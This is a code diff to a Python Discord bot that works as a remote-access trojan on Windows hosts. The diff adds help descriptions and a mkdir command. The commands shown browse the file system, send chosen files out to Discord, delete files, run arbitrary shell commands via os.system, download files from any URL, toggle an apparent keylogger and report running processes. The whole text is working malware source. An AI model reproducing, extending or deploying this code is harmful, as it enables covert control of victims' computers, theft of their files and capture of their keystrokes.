@@ -46,7 +46,6 @@ def move(arg1, arg2):
 def removefile(arg1):
     os.remove(arg1)
 
-
 def removefolder(arg1):
     os.rmdir(arg1)
 
@@ -55,27 +54,30 @@ def dwl(arg1, arg2):
     local_file = arg2
     request.urlretrieve(remote_url, local_file)
 
+def makefolder(arg1):
+    os.mkdir(arg1)
+
 #File System cmd
-@bot.command()
+@bot.command(brief='', description='See all the files and folders in you current dictionary. The dictionary is set to C:\\ by default')
 async def ls(ctx):
     await ctx.send("" + lsSys())
 
-@bot.command()
+@bot.command(brief='[Path]', description='Change your current dictionary and always enter the full path')
 async def cd(ctx, arg1):
     await ctx.send("" + cdSys(arg1))
 
-@bot.command()
+@bot.command(brief='', description='Shows your current dictionary')
 async def pwd(ctx):
     await ctx.send(currentdic)
 
-@bot.command()
+@bot.command(brief='[Path]', description='Sends a file/image from the path you have entered. It is not possible to send a file which is larger then 9 Mb')
 async def fetch(ctx, arg1):
     try:
         await ctx.send(file=discord.File(arg1))
     except:
         await ctx.send("File is to large to send")
 
-@bot.command()
+@bot.command(brief='[Source] [Destination]', description='Moves a file from [Source] to [Destination]')
 async def mv(ctx, arg1, arg2):
     try:
         move(arg1=arg1, arg2=arg2)
@@ -83,7 +85,7 @@ async def mv(ctx, arg1, arg2):
     except:
         await ctx.send("File couldn't be moved")
 
-@bot.command()
+@bot.command(brief='[Path]', description='Deletes a file')
 async def rm(ctx, arg1):
     if os.path.exists(arg1):
         removefile(arg1=arg1)
@@ -91,7 +93,7 @@ async def rm(ctx, arg1):
     else:
        await ctx.send("File couldn't be deleted")    
 
-@bot.command()
+@bot.command(brief='[Path]', description='Deletes a folder')
 async def rmdir(ctx, arg1):
     if os.path.exists(arg1):
         removefolder(arg1=arg1)
@@ -99,7 +101,15 @@ async def rmdir(ctx, arg1):
     else:
        await ctx.send("Folder couldn't be deleted")   
 
-@bot.command()
+@bot.command(brief='[Path]', description='Creates a folder')
+async def mkdir(ctx, arg1):
+    if not os.path.exists(arg1):
+        makefolder(arg1=arg1)
+        await ctx.send("Folder was created")
+    else:
+       await ctx.send("Folder already exists")   
+
+@bot.command(brief='[Command]', description='Executes a command on the default command line')
 async def cmd(ctx, arg1):
     try:
         os.system(arg1)
@@ -107,7 +117,7 @@ async def cmd(ctx, arg1):
     except:
         await ctx.send("Comannd couldn't be executed")
 
-@bot.command()
+@bot.command(brief='[SourceLink] [LocalDestination]', description='Downloads a file from [SourceLink] to [LocalDestination]')
 async def download(ctx, arg1, arg2):
     try:
         dwl(arg1=arg1, arg2=arg2)
@@ -117,7 +127,7 @@ async def download(ctx, arg1, arg2):
 
 #Logger cmd
 
-@bot.command()
+@bot.command(brief='[on/off]', description='Starts/Stops the logger')
 async def logger(ctx, arg1):
     if arg1 == "on":
         listener.start()
@@ -128,7 +138,7 @@ async def logger(ctx, arg1):
 
 #Process cmd
 
-@bot.command()
+@bot.command(brief='[on/off]', description='Starts/Stops logging the processes')
 async def process(ctx, arg1):
     if arg1 == "on":
         checkapp.start()
@@ -137,7 +147,7 @@ async def process(ctx, arg1):
     else:
         await ctx.send("Invalid Syntax")
 
-@bot.command()
+@bot.command(brief='', description='Sends all processes which are currently running')
 async def nowrunning(ctx):
     for proc in psutil.process_iter():
         try:
